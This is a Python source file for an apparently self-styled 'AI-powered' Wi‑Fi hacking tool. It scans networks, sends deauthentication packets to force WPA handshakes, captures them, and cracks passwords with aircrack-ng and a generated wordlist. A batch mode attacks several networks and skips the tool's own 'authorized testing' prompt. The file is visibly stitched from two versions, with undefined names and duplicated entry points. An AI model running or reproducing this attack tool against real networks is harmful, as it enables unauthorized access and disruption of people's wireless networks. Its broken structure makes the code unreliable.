#!/usr/bin/env python3
"""
Hack WiFi AI - Main Entry Point
Advanced AI-Powered WiFi Security Assessment Tool
Educational Use Only - Authorized Testing Required
"""

import os
import argparse
import json
import logging
from pathlib import Path

def configure_logging(log_path: Optional[str] = None) -> None:
    """Configure console + optional file logging for the Wi‑Fi tool."""
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    console = logging.StreamHandler()
    console.setFormatter(formatter)
    logger.addHandler(console)
    if log_path:
        file_handler = logging.FileHandler(log_path, encoding='utf-8')
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)

def save_result(ssid: str, password: Optional[str], out_path: Optional[str]) -> None:
    """Append a JSON line with the cracking result for one SSID."""
    entry = {
        'ssid': ssid,
        'found': password is not None,
        'password': password,
    }
    if out_path:
        try:
            with open(out_path, 'a', encoding='utf-8') as f:
                f.write(json.dumps(entry) + '\n')
        except Exception as e:
            logging.error(f"Failed to write result to {out_path}: {e}")
    else:
        logging.info(f"Result for {ssid}: {entry}")

def main_cli() -> None:
    parser = argparse.ArgumentParser(description='AI‑powered Wi‑Fi security testing tool (real‑mode)')
    parser.add_argument('--interface', help='Wi‑Fi interface to use (auto‑detect if omitted)')
    parser.add_argument('--output', help='Path to JSON‑lines result file')
    parser.add_argument('--log', help='Path to log file')
    parser.add_argument('--wordlist', help='Path to save the AI‑generated wordlist (optional)')
    parser.add_argument('--ssid-file', help='Path to a file containing SSIDs (one per line) for batch testing')
    args = parser.parse_args()

    configure_logging(args.log)
    logging.info('Starting Hack Wi‑Fi AI')

    wifi_tool = HackWifiAI()
    iface = args.interface if args.interface else wifi_tool.setup_environment()
    if not iface:
        logging.error('Failed to set up environment')
        return

    networks = wifi_tool.scan_networks()
    if not networks:
        logging.error('No networks discovered')
        return

    target_ssids: List[str] = []
    if args.ssid_file:
        try:
            with open(args.ssid_file, 'r', encoding='utf-8') as f:
                target_ssids = [line.strip() for line in f if line.strip()]
        except Exception as e:
            logging.error(f"Unable to read SSID file {args.ssid_file}: {e}")
            return
    else:
        # Interactive selection fallback
        if not wifi_tool.select_target(networks):
            logging.error('Target selection failed')
            return
        target_ssids = [wifi_tool.target_network.ssid]

    for ssid in target_ssids:
        # Find matching network object
        network_obj = next((n for n in networks if n.ssid == ssid), None)
        if not network_obj:
            logging.warning(f"SSID '{ssid}' not found in scan results – skipping")
            continue
        wifi_tool.target_network = network_obj
        logging.info(f"Testing SSID: {ssid}")
        if not wifi_tool.capture_handshake(iface):
            logging.warning(f"Handshake capture failed for {ssid}")
            save_result(ssid, None, args.output)
            continue
        password = wifi_tool.ai_cracking_attack()
        if password:
            logging.info(f"✅ Password recovered for {ssid}: {password}")
        else:
            logging.info(f"❌ Password not recovered for {ssid}")
        save_result(ssid, password, args.output)

if __name__ == '__main__':
    main_cli()

import argparse
import json
import logging
import sys
import time
from pathlib import Path

# Add project paths to Python path
project_root = Path(__file__).parent
sys.path.extend([
    str(project_root / "core"),
    str(project_root / "ai"), 
    str(project_root / "hardware"),
    str(project_root / "utils")
])

from core.wifi_scanner import WiFiScanner
from core.packet_capturer import HandshakeCapturer
from core.deauth_attacker import DeauthAttacker
from core.ai_password_cracker import AICrackEngine
from core.security_analyzer import SecurityAnalyzer
from hardware.adapter_manager import AdapterManager
from hardware.monitor_mode import MonitorMode
from utils.wordlist_manager import WordlistManager
from utils.result_analyzer import ResultAnalyzer

class HackWifiAI:
    """Main class for AI-powered WiFi security testing"""
    
    def __init__(self):
        self.scanner = WiFiScanner()
        self.capturer = HandshakeCapturer()
        self.deauth = DeauthAttacker()
        self.cracker = AICrackEngine()
        self.analyzer = SecurityAnalyzer()
        self.adapter = AdapterManager()
        self.monitor = MonitorMode()
        self.wordlist = WordlistManager()
        self.results = ResultAnalyzer()
        
        self.target_network = None
        self.capture_file = None
        
    def display_banner(self):
        """Display tool banner"""
        print("\n" + "="*70)
        print("🔐 HACK WIFI AI - Advanced WiFi Security Testing Tool")
        print("🤖 AI-Powered Password Cracking & Security Assessment")
        print("🎯 Educational Use Only - Version 2025.1")
        print("="*70)
        
    def legal_warning(self):
        """Display legal warnings and get confirmation"""
        print("\n⚖️  LEGAL DISCLAIMER:")
        print("THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY!")
        print("UNAUTHORIZED ACCESS TO WIFI NETWORKS IS ILLEGAL!")
        print("\n✅ PERMITTED USES:")
        print("  - Testing your own WiFi networks")
        print("  - Authorized penetration testing with written permission")
        print("  - Educational security awareness")
        print("\n❌ PROHIBITED USES:")
        print("  - Unauthorized network access")
        print("  - Malicious hacking activities")
        print("  - Any illegal activities")
        
        confirm = input("\nType 'AUTHORIZED TESTING' to continue: ")
        if confirm != "AUTHORIZED TESTING":
            print("❌ Operation cancelled. Legal compliance required.")
            sys.exit(1)
            
    def setup_environment(self):
        """Setup required environment and permissions"""
        print("\n🔧 Setting up environment...")
        
        # Check root privileges
        if os.geteuid() != 0:
            print("❌ Root privileges required. Run with: sudo python main.py")
            sys.exit(1)
            
        # Check for required tools
        if not self.adapter.check_required_tools():
            print("❌ Required tools missing. Run install.sh first.")
            sys.exit(1)
            
        # Setup monitor mode
        interface = self.adapter.detect_wifi_adapters()
        if not interface:
            print("❌ No compatible WiFi adapter found.")
            sys.exit(1)
            
        print(f"📡 Using interface: {interface}")
        return interface
        
    def scan_networks(self):
        """Scan for available WiFi networks"""
        print("\n📶 Scanning for WiFi networks...")
        networks = self.scanner.scan_networks()
        
        if not networks:
            print("❌ No WiFi networks found.")
            return False
            
        print(f"📡 Found {len(networks)} networks:")
        for i, network in enumerate(networks[:15]):  # Show first 15
            print(f"  {i+1:2d}. {network.ssid:20} {network.signal:3}% {network.security:15} {network.bssid}")
            
        return networks
    
    def select_target(self, networks):
        """Select target network from scanned list"""
        try:
            selection = int(input("\n🎯 Select target network (number): ")) - 1
            if 0 <= selection < len(networks):
                self.target_network = networks[selection]
                print(f"✅ Target: {self.target_network.ssid} ({self.target_network.bssid})")
                return True
            else:
                print("❌ Invalid selection")
                return False
        except ValueError:
            print("❌ Please enter a valid number")
            return False
    
    def capture_handshake(self, interface):
        """Capture WPA handshake from target network"""
        print(f"\n🎣 Attempting to capture WPA handshake...")
        print(f"   Target: {self.target_network.ssid}")
        print(f"   Channel: {self.target_network.channel}")
        print(f"   Interface: {interface}")
        
        # Start handshake capture
        capture_success = self.capturer.start_capture(
            interface=interface,
            target_bssid=self.target_network.bssid,
            channel=self.target_network.channel
        )
        
        if not capture_success:
            print("❌ Failed to start capture")
            return False
            
        # Start deauth attack to force handshake
        print("⚡ Sending deauth packets to force handshake...")
        deauth_thread = self.deauth.start_deauth_attack(
            interface=interface,
            target_bssid=self.target_network.bssid,
            duration=30
        )
        
        # Monitor for handshake
        print("⏳ Waiting for WPA handshake (30 seconds)...")
        handshake_captured = False
        for i in range(30):
            if self.capturer.check_handshake():
                handshake_captured = True
                break
            time.sleep(1)
            print(f"   {29-i}s remaining...", end='\r')
            
        # Stop attacks
        self.deauth.stop_attack()
        self.capturer.stop_capture()
        
        if handshake_captured:
            self.capture_file = self.capturer.get_capture_file()
            print(f"\n✅ WPA handshake captured: {self.capture_file}")
            return True
        else:
            print("\n❌ No handshake captured")
            return False
    
    def ai_cracking_attack(self):
        """Perform AI-powered password cracking"""
        print(f"\n🤖 Starting AI-powered password cracking...")
        print(f"   Target: {self.target_network.ssid}")
        print(f"   Handshake: {self.capture_file}")
        
        # Generate AI wordlist based on SSID analysis
        print("🧠 Analyzing SSID patterns for AI password generation...")
        wordlist_file = self.wordlist.generate_ai_wordlist(
            ssid=self.target_network.ssid,
            count=100000  # 100K AI-generated passwords
        )
        
        # Start cracking with aircrack-ng
        print("🔓 Launching aircrack-ng with AI wordlist...")
        password = self.cracker.crack_handshake(
            capture_file=self.capture_file,
            wordlist_file=wordlist_file,
            ssid=self.target_network.ssid
        )
        
        return password
    
    def run_security_analysis(self):
        """Perform comprehensive security analysis"""
        print(f"\n🔍 Running security analysis...")
        report = self.analyzer.analyze_network(self.target_network)
        self.analyzer.generate_report(report)
        return report
    
    def main_flow(self):
        """Main execution flow"""
        self.display_banner()
        self.legal_warning()
        
        # Setup
        interface = self.setup_environment()
        
        # Scan and select target
        networks = self.scan_networks()
        if not networks or not self.select_target(networks):
            return
            
        # Enable monitor mode
        monitor_interface = self.monitor.enable_monitor_mode(interface)
        if not monitor_interface:
            print("❌ Failed to enable monitor mode")
            return
            
        # Capture handshake
        if not self.capture_handshake(monitor_interface):
            self.monitor.disable_monitor_mode(interface)
            return
            
        # Crack password
        password = self.ai_cracking_attack()
        
        # Security analysis
        report = self.run_security_analysis()
        
        # Display results
        print("\n" + "="*60)
        print("🎯 HACK WIFI AI - RESULTS")
        print("="*60)
        
        if password:
            print(f"✅ PASSWORD CRACKED: {password}")
            print(f"📶 Network: {self.target_network.ssid}")
            print(f"🔑 Security: {self.target_network.security}")
        else:
            print("❌ Password not found with AI attack")
            print("💡 Try with larger wordlist or different AI strategy")
            
        print(f"\n📊 Security Assessment:")
        for key, value in report.items():
            print(f"   {key}: {value}")
            
        # Cleanup
        self.monitor.disable_monitor_mode(interface)
        print(f"\n🧹 Cleanup complete. Monitor mode disabled.")

if __name__ == "__main__":
    try:
        app = HackWifiAI()
        app.main_flow()
    except KeyboardInterrupt:
        print("\n⏹️  Operation cancelled by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
